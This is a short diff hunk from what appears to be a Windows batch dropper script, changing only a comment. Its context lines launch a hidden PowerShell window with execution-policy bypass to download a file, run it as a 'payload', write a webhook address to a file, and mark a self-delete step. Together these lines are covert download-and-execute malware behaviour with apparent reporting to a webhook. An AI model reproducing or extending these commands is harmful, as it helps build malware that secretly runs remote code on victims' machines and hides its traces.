@@ -17,7 +17,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI
 @REM run payload
 powershell ./wget.cmd
 
-@REM Send information to Webhook
+@REM make file with webhook 
 echo %WEBHOOK% >> webhook
 
 @REM self delete
